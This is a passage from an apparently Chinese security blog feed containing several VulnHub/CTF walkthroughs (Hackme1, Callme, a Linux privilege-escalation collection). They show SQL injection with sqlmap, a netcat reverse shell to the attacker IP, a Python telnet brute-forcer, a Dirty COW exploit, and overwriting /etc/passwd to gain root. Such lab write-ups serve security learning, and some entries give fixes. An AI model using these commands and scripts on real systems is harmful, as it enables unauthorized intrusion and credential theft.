alt="image-20201222111759528"></p><p>脏牛exp：<a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679">https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679</a></p><p>这里要注意要一下，因为这个exp是64位的，我们这台机器是32位的，我们需要使用32位的shellcode。稍微修改一下脚本即可。</p><p><img src="https://img.rruu.net/image/5fe6d6eea7149" alt="image-20201222124914503"></p><p>上传到目标机器上使用gcc编译，出现错误不需要管他。脏牛一样可以提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o cowroot -pthread</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d6f3e52dc" alt="image-20201222124953203"></p><p>执行exp，凡是内核漏洞权限提升都不是很稳定，都有可能提坏机器。这里我就提坏了，重启了好几次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cowroot</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d6f92f74d" alt="image-20201222125041299"></p><p>获取flag文件</p><p><img src="https://img.rruu.net/image/5fe6d6febbf46" alt="image-20201222125307554"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hackme1</title>
      <link href="2020/12/26/Hackme1/"/>
      <url>2020/12/26/Hackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.132.140</p><p>靶机IP：192.168.132.139</p><h2 id="Nmap探测信息"><a href="#Nmap探测信息" class="headerlink" title="Nmap探测信息"></a>Nmap探测信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -n -p- 192.168.132.139 -oN hackme#1.nmap</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d621261d7" alt="image-20201221161900997"></p><p>端口开放：22 80</p><p>端口开放情况分析：</p><p>22 ssh</p><p>80 web</p><p>攻击方向放在web。</p><h2 id="80端口漏洞测试"><a href="#80端口漏洞测试" class="headerlink" title="80端口漏洞测试"></a>80端口漏洞测试</h2><p>打开 <a href="http://192.168.132.139/login.php">http://192.168.132.139/login.php</a></p><p><img src="https://img.rruu.net/image/5fe6d627467a9" alt="image-20201221162428331"></p><p>简单查看一下页面的功能</p><p>先注册一个用户username：magisec password：magisec</p><p><img src="https://img.rruu.net/image/5fe6d62c11252" alt="image-20201221162939395"></p><p>reset your passwd这个功能是没有的，我们扫一下目录，看看是不是改了名字。不着急测试，先用gobuster扫描一下目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.132.139 -o hackme1</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d630d5b21" alt="image-20201221164607107"></p><p>留意一下upload目录，后面可能这张图片存有东西。</p><p><img src="https://img.rruu.net/image/5fe6d63674e5b" alt="image-20201221164631446"></p><h3 id="手工检测SQL注入"><a href="#手工检测SQL注入" class="headerlink" title="手工检测SQL注入"></a>手工检测SQL注入</h3><p>测试这个welcome.php，他这个下面有那个输入框，可能存在注入，因为是搜索功能，我们注入要闭合才可以。</p><p><img src="https://img.rruu.net/image/5fe6d63cd1b86" alt="image-20201221164832595"></p><p>burpsuite抓包测试</p><p><img src="https://img.rruu.net/image/5fe6d6415295e" alt="image-20201221165027784"></p><p>返回正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:a&#39;+or+1&#x3D;2#</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d64692af0" alt="image-20201221165239172"></p><p>返回错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:a&#39;+or+1&#x3D;2#</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d64cab637" alt="image-20201221165132576"></p><p>存在注入，我们将数据包保存为sql.txt使用sqlmap继续注入。</p><h3 id="SQLmap利用注入漏洞"><a href="#SQLmap利用注入漏洞" class="headerlink" title="SQLmap利用注入漏洞"></a>SQLmap利用注入漏洞</h3><p>sqlmap检测存在注入</p><p><img src="https://img.rruu.net/image/5fe6d65222f59" alt="image-20201221165452742"></p><p>判断一下是否为root权限，权限决定我们的渗透方向。</p><p><img src="https://img.rruu.net/image/5fe6d6593ba40" alt="image-20201221165546013"></p><p>因为是root权限我们尝试写shell，失败了。</p><p>跑一下数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d65f35941" alt="image-20201221165322281"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmpa -r sql.txt -D &quot;webapphacking&quot; -T &quot;users&quot; --dump</span><br></pre></td></tr></table></figure><p>跑出来用户名密码，关注一下superadmin，密码我们去md5解密获取为Uncrackable</p><p><img src="https://img.rruu.net/image/5fe6d6652fe9f" alt="image-20201221174511714"></p><p>将上面密码解密，然后做成user.txt与pass.txt</p><p><img src="https://img.rruu.net/image/5fe6d66b574bc" alt="image-20201221175819745"></p><h3 id="上传漏洞getshell"><a href="#上传漏洞getshell" class="headerlink" title="上传漏洞getshell"></a>上传漏洞getshell</h3><p>登录一下superadmin用户</p><p><img src="https://img.rruu.net/image/5fe6d67051e67" alt="image-20201221174826982"></p><p>上传突破看看可不可以getshel回来。</p><p><img src="https://img.rruu.net/image/5fe6d675a33d2" alt="image-20201221175012797"></p><p>上传成功，我们反弹一下shell。nc监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d67a432af" alt="image-20201221175147102"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+192.168.132.140+9001+%3e%2ftmp%2ff</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d67ea9529" alt="image-20201221175137452"></p><h3 id="Python切换bash"><a href="#Python切换bash" class="headerlink" title="Python切换bash"></a>Python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看config.php welcomeadmin.php 没有发现任何有价值的东西</p><p><img src="https://img.rruu.net/image/5fe6d6831f66e" alt="image-20201221180515131"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var</span><br></pre></td></tr></table></figure><p>查看backups目录，未发现任何有价值的东西</p><p><img src="https://img.rruu.net/image/5fe6d687f209e" alt="image-20201221180603004"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home</span><br></pre></td></tr></table></figure><p>发现存在两个用户</p><p>一个是hackme 一个是legacy，先进入hackme，有一个比较特殊的文件，可惜没有执行权限。</p><p><img src="https://img.rruu.net/image/5fe6d68ed1364" alt="image-20201221180755514"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;.sudo_as_admin_successful</span><br></pre></td></tr></table></figure><h3 id="特权提升-1"><a href="#特权提升-1" class="headerlink" title="特权提升"></a>特权提升</h3><p>来到legacy目录</p><p><img src="https://img.rruu.net/image/5fe6d693b25aa" alt="image-20201221180853419"></p><p>发现touchmenot文件是一个二进制的可执行文件，我们有执行权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;touchmenot</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d6986d7a6" alt="image-20201221181017980"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Callme</title>
      <link href="2020/12/25/Callme/"/>
      <url>2020/12/25/Callme/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.122</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oN callme.nmap 192.168.56.122</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5b226d9938" alt="image-20201225155907560"></p><p>22 ssh</p><p>111 rpcbind</p><p>2323 未知</p><h2 id="2323端口检测"><a href="#2323端口检测" class="headerlink" title="2323端口检测"></a>2323端口检测</h2><h3 id="探测信息"><a href="#探测信息" class="headerlink" title="探测信息"></a>探测信息</h3><p>使用nc连接探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.56.122 2323</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5b22d48a51" alt="image-20201225160014303"></p><p>我们使用telnet连接一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.56.122 2323</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5b2329d333" alt="image-20201225160050624"></p><h3 id="python3编写socket爆破脚本"><a href="#python3编写socket爆破脚本" class="headerlink" title="python3编写socket爆破脚本"></a>python3编写socket爆破脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim brute.py</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">with open(&quot;.&#x2F;top500.txt&quot;) as file:</span><br><span class="line">    for password in file:</span><br><span class="line">        username &#x3D; b&quot;admin&quot;</span><br><span class="line">        password &#x3D; password.strip()</span><br><span class="line">        print(&quot;Password is brute force: %s&quot; % password)</span><br><span class="line">        password &#x3D; password.encode()</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.56.122&quot;, 2323))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        time.sleep(1.5)</span><br><span class="line">        s.send(username+b&#39;\r\n&#39;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(password+b&#39;\r\n&#39;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        if &quot;Wrong password for user admin&quot; not in str(s.recv(1024)):</span><br><span class="line">            print(&quot;[*]The password of admin is %s&quot; % password.decode())</span><br><span class="line">            break</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure><p>我们使用一份top500的字典进行爆破，每次爆破要sleep一下，要不然靶机服务反映不过来。Python3运行，等待爆破结果。</p><p><img src="https://img.rruu.net/image/5fe5b237bdce4" alt="image-20201225160308702"></p><p>等待大概5分钟左右，程序就可以爆破出来了密码。</p><p><img src="https://img.rruu.net/image/5fe5b23cd581f" alt="image-20201225160847184"></p><p>使用telnet登录，会给我们一串很奇怪的东西。给我们一串数字，然后又跟我说我还没有准备好，感觉是会反弹回来一个shell，给的是端口。</p><p><img src="https://img.rruu.net/image/5fe5b242eafa7" alt="image-20201225160958623"></p><h3 id="python编写exp反弹shell"><a href="#python编写exp反弹shell" class="headerlink" title="python编写exp反弹shell"></a>python编写exp反弹shell</h3><p>运行即可反弹shell，需要先安装word2number</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import socket,time,os</span><br><span class="line">from word2number import w2n</span><br><span class="line"></span><br><span class="line">username &#x3D; b&quot;admin&quot;</span><br><span class="line">password &#x3D; b&quot;booboo&quot;</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.56.122&quot;, 2323))</span><br><span class="line">time.sleep(1)</span><br><span class="line">s.send(username+b&#39;\r\n&#39;)</span><br><span class="line">s.send(password+b&#39;\r\n&#39;)</span><br><span class="line">num &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    body &#x3D; s.recv(1024)</span><br><span class="line">    if body &#x3D;&#x3D; b&quot;&quot;:</span><br><span class="line">        break</span><br><span class="line">    elif num &#x3D;&#x3D; 3:</span><br><span class="line">        port &#x3D; w2n.word_to_num(body.decode().lower().strip())</span><br><span class="line">        os.system(&quot;nc -lvnp &quot; + str(port))</span><br><span class="line">        continue</span><br><span class="line">    print(body)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>获取flag.txt</p><p><img src="https://img.rruu.net/image/5fe5b2481f654" alt="image-20201225162607358"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type local.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5b24cd6fd8" alt="image-20201225162620780"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux特权提升技术合集</title>
      <link href="2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/"/>
      <url>2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux提权技术合集"><a href="#Linux提权技术合集" class="headerlink" title="Linux提权技术合集"></a>Linux提权技术合集</h1><h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>靶机下载地址：<a href="http://www.vulnhub.com/entry/linesc-1,616/">http://www.vulnhub.com/entry/linesc-1,616/</a></p><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.117</p><p>用户：muhammad 密码：nasef</p><p>说明：教程中有运用其他环境，都是我以往使用的特权提升技术。</p><h2 id="sudo查看"><a href="#sudo查看" class="headerlink" title="sudo查看"></a>sudo查看</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe544eca18d5" alt="image-20201222194319348"></p><h2 id="apt-get权限滥用特权提升"><a href="#apt-get权限滥用特权提升" class="headerlink" title="apt-get权限滥用特权提升"></a>apt-get权限滥用特权提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe544f337145" alt="image-20201222194749860"></p><p>提权完成</p><p>修补建议：为适当的文件设置适当的权限。在这种情况下，请修改/ etc / sudoers 降低不必要的权限。</p><h2 id="二进制程序权限滥用"><a href="#二进制程序权限滥用" class="headerlink" title="二进制程序权限滥用"></a>二进制程序权限滥用</h2><p>该二进制文件有源代码，源代码上面是执行一个shell出来。在sudo中，这个程序不需要root密码即可运行，所以我们使用sudo来运行该二进制文件即可提权。</p><p><img src="https://img.rruu.net/image/5fe544f9441ae" alt="image-20201222194836884"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;sudo</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe544fe8a8d4" alt="image-20201222195029811"></p><p>修补建议：为适当的文件设置适当的权限。在这种情况下，请修改/ etc / sudoers 降低不必要的权限。</p><h2 id="ssh私钥泄露提权"><a href="#ssh私钥泄露提权" class="headerlink" title="ssh私钥泄露提权"></a>ssh私钥泄露提权</h2><p>来到vuln的3目录看见一个key，一眼看出来是一个私钥。推测是root用户的key，我们使用root ssh连接一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54503cc858" alt="image-20201222200120693"></p><p>保存到kali下</p><p><img src="https://img.rruu.net/image/5fe5450ae70a3" alt="image-20201222200222569"></p><p>要给id_rsa 600权限，要不然读取不到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54511eb892" alt="image-20201222200317346"></p><p>ssh key连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.56.117 -i .&#x2F;id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54516c18e9" alt="image-20201222200406692"></p><p>修补办法：将私钥删除。</p><h2 id="shadow文件可读"><a href="#shadow文件可读" class="headerlink" title="shadow文件可读"></a>shadow文件可读</h2><p>查找shadow文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;etc&#x2F; | grep shadow</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5451ba6de3" alt="image-20201222202957585"></p><p>读一下shadow文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545204382b" alt="image-20201222203036115"></p><p>发现root密码，我们将root进行破解。</p><p><img src="https://img.rruu.net/image/5fe5452613f35" alt="image-20201222203151280"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5452b5428e" alt="image-20201222203211883"></p><p>获得root密码，su切换root用户完成提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54530c914f" alt="image-20201222203329457"></p><p>修补建议：为适当的文件设置适当的权限。在这种情况下，我们应该删除其他用户的阅读权限。</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>搜索具有suid权限的可执行文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54535e5bb7" alt="image-20201222205416808"></p><h3 id="二进制程序权限滥用特权提升"><a href="#二进制程序权限滥用特权提升" class="headerlink" title="二进制程序权限滥用特权提升"></a>二进制程序权限滥用特权提升</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;muhammad&#x2F;vuln&#x2F;1&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5453c1a84b" alt="image-20201222205518447"></p><p>这个suid文件，执行之后会有一个shell返回，这个shell是具有root权限的。id查看权限，不是root，但是对/etc/passwd有读写权限，我们来添加一个root用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;suid</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54540d7b52" alt="image-20201222205616725"></p><p>切回kali，生成密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545479fd08" alt="image-20201222205837567"></p><p>复制目标/etc/passwd到kali下，将我们生成的密码，按照格式写入。</p><p><img src="https://img.rruu.net/image/5fe5454ef3b5d" alt="image-20201222210710593"></p><p>python开启http服务器，使用wget覆盖/etc/passwd。</p><p><img src="https://img.rruu.net/image/5fe5455545346" alt="image-20201222210749391"></p><p>靶机执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5455aec55c" alt="image-20201222210813978"></p><p>退出当前shell，切换magisec用户，密码123456。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5456077ef6" alt="image-20201222210836258"></p><p>修复建议：取消suid文件suid权限</p><h3 id="php特权提升"><a href="#php特权提升" class="headerlink" title="php特权提升"></a>php特权提升</h3><p><img src="https://img.rruu.net/image/5fe3fc9f222a0" alt="image-20201219140613095"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/5fe3fca60826e" alt="image-20201219140653525"></p><h3 id="cp提权"><a href="#cp提权" class="headerlink" title="cp提权"></a>cp提权</h3><p>将靶机的passwd文件，拷贝到kali上面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>openssl生成密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545722068f" alt="image-20201222211645651"></p><p>python启动http服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54576e52c7" alt="image-20201222211727438"></p><p>wget下载passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5457ba94e2" alt="image-20201222211906351"></p><p>cp命令覆盖/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .&#x2F;passwd &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54580b5f34" alt="image-20201222211959262"></p><p>提权完成</p><p>修复建议：将cp的suid去除</p><h2 id="CRONJOBS特权提升"><a href="#CRONJOBS特权提升" class="headerlink" title="CRONJOBS特权提升"></a>CRONJOBS特权提升</h2><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545857cbdd" alt="image-20201223095546811"></p><p>发现系统每一分钟以root权限执行script.sh。我去跟进去看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat script.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5458c09151" alt="image-20201223095701572"></p><p>查看权限，发现我们对passwd和script都有读写权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545914f8a2" alt="image-20201223095816820"></p><p>我们看一下script的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .&#x2F;script.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54595ccec1" alt="image-20201223095934163"></p><p>发现，他使用passwd文件覆盖了系统自带的passwd文件，我们对passwd文件有权限，所以我们可以添加一个root权限的用户。切回kali，生成密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5459ad4d0b" alt="image-20201223100129793"></p><p>切回靶机ssh连接，修改passwd文件，修改为这样。</p><p><img src="https://img.rruu.net/image/5fe545a01c4da" alt="image-20201223100151022"></p><p>等待系统执行，我们就可以添加一个用户了。需要一分钟。</p><p><img src="https://img.rruu.net/image/5fe545a652be3" alt="image-20201223100327619"></p><p>我们su切换magisec用户，密码123456.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545ac517c8" alt="image-20201223100409684"></p><p>修复建议：建议将passwd文件与script权限降低，不给普通用户写权限。</p><h2 id="NFS特权提升"><a href="#NFS特权提升" class="headerlink" title="NFS特权提升"></a>NFS特权提升</h2><p>查看靶机挂载目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.56.117</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545b13c523" alt="image-20201223100926200"></p><p>将目标靶机nfs目录挂载到mnt目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.56.117:&#x2F;home&#x2F;muhammad &#x2F;mnt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545b6bcb8f" alt="image-20201223102404945"></p><p>创建setuid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;exp.c</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545bc5373d" alt="image-20201223103537054"></p><p>gcc编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545c0f0cec" alt="image-20201223104151886"></p><p>复制到/mnt目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .&#x2F;exp &#x2F;mnt&#x2F;exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545c6d31a6" alt="image-20201223104243518"></p><p>查看/mnt目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545cce75e5" alt="image-20201223104302095"></p><p>赋予suid权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x .&#x2F;exp</span><br></pre></td></tr></table></figure><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20201223104326335.png" alt="image-20201223104326335"  